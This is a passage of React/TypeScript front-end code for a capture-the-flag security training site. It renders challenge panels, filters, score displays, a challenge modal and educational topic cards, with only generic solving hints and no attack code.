                    onChange={(e) => setCryptoInput(e.target.value)}
                    placeholder="Enter the hidden flag..."
                    className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-white font-mono focus:outline-none focus:border-teal-500/50 transition-colors"
                    disabled={isSolved || !isLoggedIn}
                  />
                </div>

                <Button
                  onClick={handleChallengeSubmit}
                  className="w-full"
                  disabled={isSolved || !isLoggedIn}
                  leftIcon={<Eye className="w-4 h-4" />}
                >
                  {!isLoggedIn ? 'Login Required' : isSolved ? 'Challenge Completed' : 'Submit Flag'}
                </Button>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <p className="text-sm text-gray-400 mb-3 font-semibold flex items-center gap-2">
                    <Info className="w-4 h-4" />
                    Hints:
                  </p>
                  <ul className="text-sm text-gray-500 space-y-2 ml-6">
                    <li className="list-disc">Check LSB bits in image channels</li>
                    <li className="list-disc">Use steghide with common passwords</li>
                    <li className="list-disc">Examine EXIF metadata</li>
                  </ul>
                </div>
              </div>
            </div>
          </motion.div>
        );

      case 'osint':
        return (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6"
          >
            <div className="rounded-xl border border-white/5 bg-white/[0.02] p-8">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className={`p-3 rounded-lg border ${isSolved ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-amber-500/10 border-amber-500/20'}`}>
                    <Icon className={`w-6 h-6 ${isSolved ? 'text-emerald-400' : 'text-amber-400'}`} />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">{activeChallenge.title}</h3>
                    <p className="text-sm text-gray-500">{activeChallenge.description}</p>
                  </div>
                </div>
                {isSolved && (
                  <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-4 py-2">
                    <CheckCircle className="w-5 h-5 text-emerald-400" />
                    <span className="text-emerald-400 font-bold text-sm">Solved</span>
                  </div>
                )}
              </div>

              <div className="relative rounded-xl p-6 border border-white/5 bg-white/[0.01] mb-6">
                <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-amber-500 to-yellow-500 rounded-l-xl" />
                <p className="text-gray-400 ml-4">
                  Gather information from public sources to find the hidden flag.
                </p>
              </div>

              <div className="space-y-4">
                <div className="rounded-lg border border-amber-500/20 bg-amber-500/5 p-4">
                  <p className="text-amber-400 text-sm font-medium mb-2">Target Information:</p>
                  <ul className="text-sm text-gray-400 space-y-2 ml-4">
                    <li className="list-disc">Target: <code className="text-amber-400">@suspicious_user</code></li>
                    <li className="list-disc">Platform: <code className="text-amber-400">Social Media</code></li>
                    <li className="list-disc">Objective: <code className="text-amber-400">Find hidden email address</code></li>
                  </ul>
                </div>

                <div>
                  <label className="block text-white font-medium mb-2">Found Information / Flag:</label>
                  <input
                    type="text"
                    value={cryptoInput}
                    onChange={(e) => setCryptoInput(e.target.value)}
                    placeholder="Enter the found flag or information..."
                    className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-white font-mono focus:outline-none focus:border-amber-500/50 transition-colors"
                    disabled={isSolved || !isLoggedIn}
                  />
                </div>

                <Button
                  onClick={handleChallengeSubmit}
                  className="w-full"
                  disabled={isSolved || !isLoggedIn}
                  leftIcon={<Search className="w-4 h-4" />}
                >
                  {!isLoggedIn ? 'Login Required' : isSolved ? 'Challenge Completed' : 'Submit Intel'}
                </Button>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <p className="text-sm text-gray-400 mb-3 font-semibold flex items-center gap-2">
                    <Info className="w-4 h-4" />
                    Hints:
                  </p>
                  <ul className="text-sm text-gray-500 space-y-2 ml-6">
                    <li className="list-disc">Check social media profiles for metadata</li>
                    <li className="list-disc">Use WHOIS to find domain registration info</li>
                    <li className="list-disc">Image reverse search may help</li>
                  </ul>
                </div>
              </div>
            </div>
          </motion.div>
        );

      case 'mobile-security':
        return (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6"
          >
            <div className="rounded-xl border border-white/5 bg-white/[0.02] p-8">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className={`p-3 rounded-lg border ${isSolved ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-cyan-500/10 border-cyan-500/20'}`}>
                    <Icon className={`w-6 h-6 ${isSolved ? 'text-emerald-400' : 'text-cyan-400'}`} />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">{activeChallenge.title}</h3>
                    <p className="text-sm text-gray-500">{activeChallenge.description}</p>
                  </div>
                </div>
                {isSolved && (
                  <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-4 py-2">
                    <CheckCircle className="w-5 h-5 text-emerald-400" />
                    <span className="text-emerald-400 font-bold text-sm">Solved</span>
                  </div>
                )}
              </div>

              <div className="relative rounded-xl p-6 border border-white/5 bg-white/[0.01] mb-6">
                <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-cyan-500 to-blue-500 rounded-l-xl" />
                <p className="text-gray-400 ml-4">
                  Analyze the mobile application to find vulnerabilities and extract secrets.
                </p>
              </div>

              <div className="space-y-4">
                <div className="rounded-lg border border-cyan-500/20 bg-cyan-500/5 p-4">
                  <p className="text-cyan-400 text-sm font-medium mb-2">Application Details:</p>
                  <ul className="text-sm text-gray-400 space-y-2 ml-4">
                    <li className="list-disc">APK File: <code className="text-cyan-400">vulnerable_app.apk</code></li>
                    <li className="list-disc">Platform: <code className="text-cyan-400">Android</code></li>
                    <li className="list-disc">Objective: <code className="text-cyan-400">Find hardcoded API key</code></li>
                  </ul>
                </div>

                <div>
                  <label className="block text-white font-medium mb-2">Extracted Secret / Flag:</label>
                  <input
                    type="text"
                    value={cryptoInput}
                    onChange={(e) => setCryptoInput(e.target.value)}
                    placeholder="Enter the extracted secret or flag..."
                    className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-white font-mono focus:outline-none focus:border-cyan-500/50 transition-colors"
                    disabled={isSolved || !isLoggedIn}
                  />
                </div>

                <Button
                  onClick={handleChallengeSubmit}
                  className="w-full"
                  disabled={isSolved || !isLoggedIn}
                  leftIcon={<Smartphone className="w-4 h-4" />}
                >
                  {!isLoggedIn ? 'Login Required' : isSolved ? 'Challenge Completed' : 'Submit Answer'}
                </Button>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <p className="text-sm text-gray-400 mb-3 font-semibold flex items-center gap-2">
                    <Info className="w-4 h-4" />
                    Hints:
                  </p>
                  <ul className="text-sm text-gray-500 space-y-2 ml-6">
                    <li className="list-disc">Decompile APK using jadx</li>
                    <li className="list-disc">Search for hardcoded strings</li>
                    <li className="list-disc">Check insecure data storage locations</li>
                  </ul>
                </div>
              </div>
            </div>
          </motion.div>
        );

      default:
        return null;
    }
  };

  // Handle escape key to close modal
  useEffect(() => {
    const handleEscape = (e: KeyboardEvent) => {
      if (e.key === 'Escape' && showChallengeModal) {
        setShowChallengeModal(false);
        setResult(null);
      }
    };

    window.addEventListener('keydown', handleEscape);
    return () => window.removeEventListener('keydown', handleEscape);
  }, [showChallengeModal]);

  // Prevent body scroll when modal is open
  useEffect(() => {
    if (showChallengeModal) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = 'unset';
    }
    return () => {
      document.body.style.overflow = 'unset';
    };
  }, [showChallengeModal]);

  // Memoized filtered challenges
  const filteredChallenges = useMemo(() => {
    let filtered = ALL_CHALLENGES;

    // Apply difficulty filter
    if (filterDifficulty !== 'All') {
      filtered = filtered.filter(challenge => challenge.difficulty === filterDifficulty);
    }

    // Apply type/category filter
    if (filterType !== 'All') {
      const categoryMapping: Record<string, ChallengeType[]> = {
        'Web Security': ['sql-injection', 'xss', 'command-injection', 'ctf'],
        'System Security': ['binary-exploitation', 'reverse-engineering'],
        'Cryptography': ['crypto'],
        'Forensics': ['forensics', 'steganography'],
        'Endpoint Security': ['mobile-security', 'osint']
      };

      const mappedTypes = categoryMapping[filterType];
      if (mappedTypes) {
        filtered = filtered.filter(challenge => mappedTypes.includes(challenge.type));
      } else {
        // Fallback for direct type selection if we ever need it, or legacy support
        // This handles the case if filterType is a direct ChallengeType (though our UI only sets categories now)
        filtered = filtered.filter(challenge => challenge.type === filterType);
      }
    }

    // Apply solved filter
    if (!showSolvedChallenges) {
      filtered = filtered.filter(challenge => !solvedChallenges.includes(challenge.id));
    }

    return filtered;
  }, [filterDifficulty, filterType, solvedChallenges, showSolvedChallenges]);

  // Reset visible challenges when filters change
  useEffect(() => {
    setVisibleChallenges(12);
  }, [filterDifficulty, filterType, showSolvedChallenges]);

  return (
    <div className="pt-32 pb-20">
      <div className="container-custom">
        {/* Hero Section - Modern & Clean */}
        <motion.div
          className="text-center mb-24"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6 }}
        >
          {/* Accent Line */}
          <div className="w-20 h-1 bg-red-600 mx-auto mb-8 rounded-sm shadow-lg shadow-red-500/20" />

          {/* Icon Badge */}
          <div className="inline-flex p-4 rounded-sm border border-red-500/20 bg-[#0B1120] mb-6">
            <Swords className="w-12 h-12 text-red-500" />
          </div>

          <h1 className="text-5xl lg:text-6xl font-black uppercase tracking-tight mb-6">
            <span className="text-white">Security</span>{' '}
            <span className="text-red-500 drop-shadow-[0_0_15px_rgba(239,68,68,0.5)]">
              Arena Playground
            </span>
          </h1>

          <p className="text-lg lg:text-xl text-gray-400 max-w-3xl mx-auto leading-relaxed mb-8">
            Interactive cybersecurity laboratory for learning and practicing penetration testing techniques
            in a safe and controlled environment
          </p>

          <div className="flex flex-wrap gap-4 justify-center">
            {isLoggedIn ? (
              <>
                <Button
                  variant="primary"
                  size="lg"
                  className="rounded-sm"
                  rightIcon={<ArrowRight className="w-5 h-5" />}
                  onClick={() => {
                    // Find first unsolved challenge
                    const firstUnsolvedChallenge = ALL_CHALLENGES.find(c => !solvedChallenges.includes(c.id));
                    if (firstUnsolvedChallenge) {
                      setActiveChallenge(firstUnsolvedChallenge);
                      setShowChallengeModal(true);
                    } else {
                      // If all solved, scroll to challenges section
                      const challengesSection = document.getElementById('available-challenges');
                      if (challengesSection) {
                        challengesSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
                      }
                    }
                  }}
                >
                  Start Learning
                </Button>
                <Button
                  variant="outline"
                  size="lg"
                  className="rounded-sm border-white/10 hover:border-red-500/30 text-white"
                  onClick={() => {
                    const challengesSection = document.getElementById('available-challenges');
                    if (challengesSection) {
                      challengesSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
                    }
                  }}
                >
                  View Challenges
                </Button>
              </>
            ) : (
              <>
                <Button
                  variant="primary"
                  size="lg"
                  className="rounded-sm"
                  onClick={() => setShowAuthModal(true)}
                  leftIcon={<Lock className="w-5 h-5" />}
                >
                  Login to Start
                </Button>
                <Button
                  variant="outline"
                  size="lg"
                  className="rounded-sm border-white/10 hover:border-red-500/30 text-white"
                  onClick={() => {
                    const challengesSection = document.getElementById('available-challenges');
                    if (challengesSection) {
                      challengesSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
                    }
                  }}
                >
                  View Challenges
                </Button>
              </>
            )}
          </div>
        </motion.div>

        {/* Score Board - Clean Stats Grid */}
        <motion.div
          className="grid grid-cols-1 md:grid-cols-3 gap-4 lg:gap-6 mb-24"
          variants={staggerContainer}
          initial="hidden"
          whileInView="visible"
          viewport={{ once: true }}
        >
          {[
            { icon: Trophy, value: score, label: 'Total Points', iconColor: 'text-red-500' },
            { icon: Star, value: solvedChallenges.length, label: 'Challenges Solved', iconColor: 'text-red-500' },
            { icon: Flag, value: ALL_CHALLENGES.length, label: 'Total Challenges', iconColor: 'text-red-500' }
          ].map((stat, idx) => {
            const Icon = stat.icon;
            return (
              <motion.div
                key={idx}
                className="relative rounded-sm p-6 text-center border border-white/10 hover:border-red-500/30 transition-all duration-300 bg-[#0B1120] hover:bg-[#0f172a] group"
                initial={{ opacity: 0, y: 20 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                transition={{ delay: idx * 0.1 }}
                whileHover={{ y: -4 }}
              >
                <Icon className={`w-8 h-8 mx-auto mb-3 ${stat.iconColor}`} />
                <div className="text-3xl lg:text-4xl font-bold text-white drop-shadow-[0_0_8px_rgba(255,255,255,0.3)] mb-2">
                  {stat.value}
                </div>
                <div className="text-xs text-gray-500 font-medium uppercase tracking-wide">
                  {stat.label}
                </div>
                <div className="absolute bottom-0 left-1/2 -translate-x-1/2 w-0 h-[2px] bg-red-500 group-hover:w-3/4 transition-all duration-500" />
              </motion.div>
            );
          })}
        </motion.div>

        {/* Progress by Difficulty */}
        <motion.div
          className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-24"
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
        >
          {[
            { diff: 'Easy', color: 'bg-red-800' },
            { diff: 'Medium', color: 'bg-red-600' },
            { diff: 'Hard', color: 'bg-red-500' },
            { diff: 'Expert', color: 'bg-red-400' }
          ].map(({ diff, color }) => {
            const totalChallenges = ALL_CHALLENGES.filter(c => c.difficulty === diff).length;
            const solvedCount = ALL_CHALLENGES.filter(c => c.difficulty === diff && solvedChallenges.includes(c.id)).length;
            const percentage = totalChallenges > 0 ? Math.round((solvedCount / totalChallenges) * 100) : 0;

            return (
              <div key={diff} className="rounded-sm border border-white/10 bg-[#0f172a] p-4">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-white font-bold text-sm">{diff}</span>
                  <span className="text-gray-500 text-xs">{solvedCount}/{totalChallenges}</span>
                </div>
                <div className="w-full bg-white/[0.05] rounded-full h-2 mb-2">
                  <div
                    className={`${color} h-2 rounded-full transition-all duration-500`}
                    style={{ width: `${percentage}%` }}
                  />
                </div>
                <span className="text-xs text-gray-500">{percentage}% Complete</span>
              </div>
            );
          })}
        </motion.div>

        {/* Available Challenges Section */}
        <div id="available-challenges" className="scroll-mt-24">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            transition={{ duration: 0.3 }}
          >
            <SectionTitle
              subtitle="Practice Arena"
              title="Available Challenges"
              className="mb-8"
            />
          </motion.div>

          {/* Toggle and Filters */}
          <motion.div
            className="flex flex-col md:flex-row gap-6 mb-8 items-start md:items-center justify-between"
            initial={{ opacity: 0, y: 10 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            transition={{ duration: 0.2 }}
          >
            <div className="flex flex-col gap-4 w-full md:w-auto">
              {/* Category Tabs */}
              <div className="flex flex-wrap gap-2">
                {[
                  { id: 'All', label: 'All Challenges' },
                  { id: 'Web Security', label: 'Web Security' },
                  { id: 'System Security', label: 'System Security' },
                  { id: 'Cryptography', label: 'Cryptography' },
                  { id: 'Forensics', label: 'Forensics' },
                  { id: 'Endpoint Security', label: 'Endpoint Security' }
                ].map((category) => (
                  <button
                    key={category.id}
                    onClick={() => {
                      setFilterType(category.id); // Re-using filterType state for Category
                      setVisibleChallenges(12);
                    }}
                    className={`px-4 py-2 font-semibold transition-all duration-300 border text-sm ${filterType === category.id
                      ? 'bg-red-600 text-white border-red-500 shadow-lg shadow-red-500/20 rounded-sm'
                      : 'bg-[#0f172a] text-gray-400 border-white/10 hover:bg-[#0B1120] hover:text-white hover:border-red-500/30 rounded-sm'
                      }`}
                  >
                    {category.label}
                  </button>
                ))}
              </div>

              {/* Difficulty Filter (Secondary) */}
              <div className="flex items-center gap-3">
                <span className="text-gray-500 text-sm font-medium">Difficulty:</span>
                <div className="flex bg-[#0f172a] p-1 rounded-sm border border-white/10">
                  {['All', 'Easy', 'Medium', 'Hard', 'Expert'].map((diff) => (
                    <button
                      key={diff}
                      onClick={() => {
                        setFilterDifficulty(diff);
                        setVisibleChallenges(12);
                      }}
                      className={`px-3 py-1.5 rounded-sm text-xs font-semibold transition-all ${filterDifficulty === diff
                        ? 'bg-red-600 text-white shadow-sm'
                        : 'text-gray-400 hover:text-white'
                        }`}
                    >
                      {diff}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            {/* Toggle Show/Hide Solved */}
            <div className="flex items-center gap-3 bg-[#0f172a] border border-white/10 rounded-sm px-4 py-2">
              <span className="text-sm text-gray-400 font-medium">
                {showSolvedChallenges ? 'Hide Solved' : 'Show All'}
              </span>
              <button
                aria-label={showSolvedChallenges ? 'Hide Solved Challenges' : 'Show All Challenges'}
                onClick={() => setShowSolvedChallenges(!showSolvedChallenges)}
                className={`relative w-12 h-6 rounded-full transition-colors ${showSolvedChallenges ? 'bg-red-600' : 'bg-gray-600'
                  }`}
              >
                <div
                  className={`absolute top-0.5 left-0.5 w-5 h-5 rounded-full bg-white transition-transform ${showSolvedChallenges ? 'translate-x-6' : 'translate-x-0'
                    }`}
                />
              </button>
            </div>
          </motion.div>

          {/* Challenges Grid */}
          {filteredChallenges.length > 0 ? (
            <motion.div
              key={`${filterDifficulty}-${filterType}-${showSolvedChallenges}`}
              className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.3 }}
            >
              {filteredChallenges
                .slice(0, visibleChallenges)
                .map((challenge) => {
                  const Icon = challenge.icon;
                  const isSolved = solvedChallenges.includes(challenge.id);

                  return (
                    <div
                      key={challenge.id}
                      className={`group relative rounded-sm border transition-all duration-300 overflow-hidden ${isSolved
                        ? 'border-red-500/30 bg-[#0B1120]'
                        : isLoggedIn
                          ? 'border-white/10 bg-[#0f172a] hover:bg-[#0B1120] hover:border-red-500/30 cursor-pointer'
                          : 'border-white/10 bg-[#0f172a] opacity-60 cursor-not-allowed'
                        }`}
                      onClick={() => {
                        if (!isLoggedIn) {
                          setShowAuthModal(true);
                          return;
                        }
                        if (!isSolved) {
                          setActiveChallenge(challenge);
                          setResult(null);
                          setSqlQuery('');
                          setXssInput('');
                          setCommandInput('');
                          setCryptoInput('');
                          setShowChallengeModal(true);
                        }
                      }}
                    >
                      {/* Top indicator for solved */}
                      {isSolved && (
                        <div className="absolute top-0 left-0 right-0 h-1 bg-red-600" />
                      )}

                      <div className="p-6">
                        {/* Header Section */}
                        <div className="flex items-start justify-between mb-4">
                          <div className="flex items-start gap-3 flex-1 min-w-0">
                            <div className={`p-3 rounded-sm border flex-shrink-0 ${isSolved
                              ? 'bg-[#0f172a] border-red-500/20'
                              : 'bg-[#0B1120] border-white/10'
                              }`}>
                              <Icon className={`w-5 h-5 ${isSolved ? 'text-red-500' : 'text-gray-400'}`} />
                            </div>

                            <div className="flex-1 min-w-0">
                              <div className="flex items-center gap-2 mb-1 flex-wrap">
                                <h3 className="text-white font-bold text-base leading-tight">
                                  {challenge.title}
                                </h3>
                                {isSolved && (
                                  <div className="flex items-center gap-1 bg-red-500/10 border border-red-500/20 rounded-sm px-2 py-0.5">
                                    <CheckCircle className="w-3.5 h-3.5 text-red-500" />
                                    <span className="text-xs text-red-500 font-bold">Solved</span>
                                  </div>
                                )}
                              </div>

                              {/* Type Badge */}
                              <span className="inline-block text-xs text-gray-500 font-medium">
                                {challenge.type === 'sql-injection' ? 'SQL Injection' :
                                  challenge.type === 'xss' ? 'Cross-Site Scripting' :
                                    challenge.type === 'command-injection' ? 'Command Injection' :
                                      challenge.type === 'crypto' ? 'Cryptography' :
                                        challenge.type === 'binary-exploitation' ? 'Binary Exploitation' :
                                          challenge.type === 'reverse-engineering' ? 'Reverse Engineering' :
                                            challenge.type === 'forensics' ? 'Digital Forensics' :
                                              challenge.type === 'steganography' ? 'Steganography' :
                                                challenge.type === 'osint' ? 'OSINT' :
                                                  challenge.type === 'mobile-security' ? 'Mobile Security' :
                                                    'Capture The Flag'}
                              </span>
                            </div>
                          </div>
                        </div>

                        {/* Description */}
                        <p className="text-gray-400 text-sm mb-4 leading-relaxed line-clamp-2">
                          {challenge.description}
                        </p>

                        {/* Footer Section */}
                        <div className="flex items-center justify-between pt-4 border-t border-white/5">
                          <div className="flex items-center gap-2 flex-wrap">
                            <span className={`inline-flex items-center px-2.5 py-1 rounded-sm text-xs font-semibold ${challenge.difficulty === 'Easy' ? 'bg-red-900/10 text-red-500 border border-red-500/20' :
                              challenge.difficulty === 'Medium' ? 'bg-red-800/10 text-red-400 border border-red-500/20' :
                                challenge.difficulty === 'Hard' ? 'bg-red-600/10 text-red-300 border border-red-500/20' :
                                  'bg-red-500/20 text-red-200 border border-red-500/30'
                              }`}>
                              {challenge.difficulty}
                            </span>
                            <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-sm bg-[#0B1120] border border-white/10">
                              <Trophy className="w-3 h-3 text-red-500" />
                              <span className="text-xs text-white font-bold">{challenge.points} pts</span>
                            </span>
                          </div>

                          {!isSolved && !isLoggedIn && (
                            <div className="flex items-center gap-1.5 text-amber-400 text-sm font-semibold">
                              <Lock className="w-4 h-4" />
                              <span className="hidden sm:inline text-xs">Login Required</span>
                            </div>
                          )}

                          {!isSolved && isLoggedIn && (
                            <div className="flex items-center gap-1.5 text-red-500 text-sm font-semibold group-hover:gap-2 transition-all">
                              <span className="hidden sm:inline">Start</span>
                              <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  );
                })}
            </motion.div>
          ) : (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="text-center py-12"
            >
              <div className="inline-flex p-6 rounded-full bg-white/[0.02] border border-white/5 mb-4">
                <Info className="w-8 h-8 text-gray-500" />
              </div>
              <h3 className="text-xl font-bold text-white mb-2">No Challenges Found</h3>
              <p className="text-gray-400 mb-6">
                No challenges match your current filters.
              </p>
              <Button
                onClick={() => {
                  setFilterDifficulty('All');
                  setFilterType('All');
                  setShowSolvedChallenges(true);
                }}
                variant="outline"
                className="border-white/10"
              >
                Reset Filters
              </Button>
            </motion.div>
          )}

          {/* View More Button */}
          {(() => {

            return visibleChallenges < filteredChallenges.length && (
              <div className="flex flex-col items-center gap-4 mb-20">
                <Button
                  onClick={() => setVisibleChallenges(prev => prev + 12)}
                  variant="outline"
                  size="lg"
                  className="rounded-sm border-white/10 hover:border-red-500/30 text-white"
                >
                  View More Challenges ({filteredChallenges.length - visibleChallenges} remaining)
                </Button>
                <button
                  onClick={() => setVisibleChallenges(filteredChallenges.length)}
                  className="text-sm text-gray-400 hover:text-red-500 transition-colors"
                >
                  Show All ({filteredChallenges.length} total)
                </button>
              </div>
            );
          })()}

          {visibleChallenges >= filteredChallenges.length && filteredChallenges.length > 12 && (
            <div className="flex justify-center mb-20">
              <button
                onClick={() => setVisibleChallenges(12)}
                className="text-sm text-gray-400 hover:text-red-500 transition-colors flex items-center gap-2"
              >
                <span>Show Less</span>
                <ArrowRight className="w-4 h-4 rotate-[-90deg]" />
              </button>
            </div>
          )}
        </div>
      </div>

      {/* Challenge Modal */}
      <AnimatePresence>
        {showChallengeModal && activeChallenge && (
          <>
            {/* Backdrop */}
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50"
              onClick={() => {
                setShowChallengeModal(false);
                setResult(null);
              }}
            />

            {/* Modal Content */}
            <div className="fixed inset-0 z-50 overflow-y-auto">
              <div className="flex min-h-full items-center justify-center p-4">
                <motion.div
                  initial={{ opacity: 0, scale: 0.95, y: 20 }}
                  animate={{ opacity: 1, scale: 1, y: 0 }}
                  exit={{ opacity: 0, scale: 0.95, y: 20 }}
                  className="relative w-full max-w-4xl"
                  onClick={(e) => e.stopPropagation()}
                >
                  <div className="relative rounded-sm border border-red-500/20 bg-[#0f172a] shadow-2xl">
                    {/* Modal Header */}
                    <div className="flex items-center justify-between p-6 border-b border-white/10 bg-[#0B1120] rounded-t-sm">
                      <div className="flex items-center gap-4 flex-1">
                        <div className="p-3 rounded-sm bg-[#0f172a] border border-white/10">
                          <activeChallenge.icon className="w-6 h-6 text-red-500" />
                        </div>
                        <div className="flex-1">
                          <h2 className="text-2xl font-bold text-white mb-2">{activeChallenge.title}</h2>
                          <div className="flex items-center gap-2 flex-wrap">
                            <span className={`inline-flex items-center px-2.5 py-1 rounded-sm text-xs font-semibold ${activeChallenge.difficulty === 'Easy' ? 'bg-red-900/10 text-red-500 border border-red-500/20' :
                              activeChallenge.difficulty === 'Medium' ? 'bg-red-800/10 text-red-400 border border-red-500/20' :
                                activeChallenge.difficulty === 'Hard' ? 'bg-red-600/10 text-red-300 border border-red-500/20' :
                                  'bg-red-500/20 text-red-200 border border-red-500/30'
                              }`}>
                              {activeChallenge.difficulty}
                            </span>
                            <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-sm bg-[#0B1120] border border-white/10">
                              <Trophy className="w-3 h-3 text-red-500" />
                              <span className="text-xs text-white font-bold">{activeChallenge.points} pts</span>
                            </span>
                            <span className="text-xs text-gray-500 font-medium">
                              {activeChallenge.type === 'sql-injection' ? 'SQL Injection' :
                                activeChallenge.type === 'xss' ? 'Cross-Site Scripting' :
                                  activeChallenge.type === 'command-injection' ? 'Command Injection' :
                                    activeChallenge.type === 'crypto' ? 'Cryptography' :
                                      activeChallenge.type === 'binary-exploitation' ? 'Binary Exploitation' :
                                        activeChallenge.type === 'reverse-engineering' ? 'Reverse Engineering' :
                                          activeChallenge.type === 'forensics' ? 'Digital Forensics' :
                                            activeChallenge.type === 'steganography' ? 'Steganography' :
                                              activeChallenge.type === 'osint' ? 'OSINT' :
                                                activeChallenge.type === 'mobile-security' ? 'Mobile Security' :
                                                  'Capture The Flag'}
                            </span>
                          </div>
                        </div>
                      </div>
                      <button
                        aria-label="Close modal"
                        onClick={() => {
                          setShowChallengeModal(false);
                          setResult(null);
                        }}
                        className="p-2 rounded-lg border border-white/10 hover:border-white/20 hover:bg-white/5 transition-colors"
                      >
                        <XCircle className="w-5 h-5 text-gray-400" />
                      </button>
                    </div>

                    {/* Modal Body */}
                    <div className="p-6 max-h-[calc(100vh-16rem)] overflow-y-auto custom-scrollbar">
                      {renderChallengeInterface()}

                      {/* Result Display */}
                      <AnimatePresence>
                        {result && (
                          <motion.div
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            exit={{ opacity: 0, y: -20 }}
                            className={`mt-6 rounded-sm border p-6 ${result.success
                              ? 'bg-[#0B1120] border-red-500/30'
                              : 'bg-red-500/5 border-red-500/30'
                              }`}
                          >
                            <div className="flex items-start gap-3">
                              {result.success ? (
                                <CheckCircle className="w-6 h-6 text-red-500 flex-shrink-0 mt-1" />
                              ) : (
                                <XCircle className="w-6 h-6 text-red-400 flex-shrink-0 mt-1" />
                              )}
                              <div className="flex-1">
                                <pre className="text-white whitespace-pre-wrap font-mono text-sm leading-relaxed">
                                  {result.message}
                                </pre>
                              </div>
                            </div>
                          </motion.div>
                        )}
                      </AnimatePresence>
                    </div>

                    {/* Modal Footer */}
                    <div className="flex items-center justify-between p-6 border-t border-white/10 bg-white/[0.02]">
                      <div className="flex items-center gap-4">
                        <div className="flex items-center gap-2">
                          <Trophy className="w-4 h-4 text-red-500" />
                          <span className="text-sm text-gray-400">
                            Score: <strong className="text-white">{score}</strong>
                          </span>
                        </div>
                        <div className="flex items-center gap-2">
                          <Star className="w-4 h-4 text-yellow-400" />
                          <span className="text-sm text-gray-400">
                            Solved: <strong className="text-white">{solvedChallenges.length}/{ALL_CHALLENGES.length}</strong>
                          </span>
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        <Button
                          onClick={() => {
                            // Find next unsolved challenge
                            const currentIndex = ALL_CHALLENGES.findIndex(c => c.id === activeChallenge?.id);
                            const nextChallenge = ALL_CHALLENGES
                              .slice(currentIndex + 1)
                              .find(c => !solvedChallenges.includes(c.id));

                            if (nextChallenge) {
                              setActiveChallenge(nextChallenge);
                              setResult(null);
                              setSqlQuery('');
                              setXssInput('');
                              setCommandInput('');
                              setCryptoInput('');
                            }
                          }}
                          variant="outline"
                          size="sm"
                          className="border-white/10"
                          disabled={!ALL_CHALLENGES.slice(ALL_CHALLENGES.findIndex(c => c.id === activeChallenge?.id) + 1).find(c => !solvedChallenges.includes(c.id))}
                        >
                          Next Challenge
                        </Button>
                        <Button
                          onClick={() => {
                            setShowChallengeModal(false);
                            setResult(null);
                            setSqlQuery('');
                            setXssInput('');
                            setCommandInput('');
                            setCryptoInput('');
                          }}
                          variant="outline"
                          className="border-white/10"
                        >
                          Close
                        </Button>
                      </div>
                    </div>
                  </div>
                </motion.div>
              </div>
            </div>
          </>
        )}
      </AnimatePresence>

      {/* Educational Section */}
      <div className="container-custom py-20">
        <SectionTitle
          subtitle="Learn Security"
          title="Educational Materials"
          className="mb-12"
        />
        <p className="text-center text-gray-400 mb-12 max-w-2xl mx-auto">
          Learn important security concepts
        </p>

        <motion.div
          className="grid grid-cols-1 md:grid-cols-3 gap-6"
          variants={staggerContainer}
          initial="hidden"
          whileInView="visible"
          viewport={{ once: true }}
        >
          {[
            {
              icon: Database,
              title: 'SQL Injection',
              description: 'Techniques to exploit insecure database queries',
              topics: ['Basic SQLi', 'Union-based', 'Blind SQLi', 'Prevention'],
              gradient: 'from-blue-500 to-cyan-500'
            },
            {
              icon: Code,
              title: 'Cross-Site Scripting',
              description: 'Inject malicious scripts into web applications',
              topics: ['Reflected XSS', 'Stored XSS', 'DOM XSS', 'Protection'],
              gradient: 'from-orange-500 to-red-500'
            },
            {
              icon: Terminal,
              title: 'Command Injection',
              description: 'Execute unauthorized system commands',
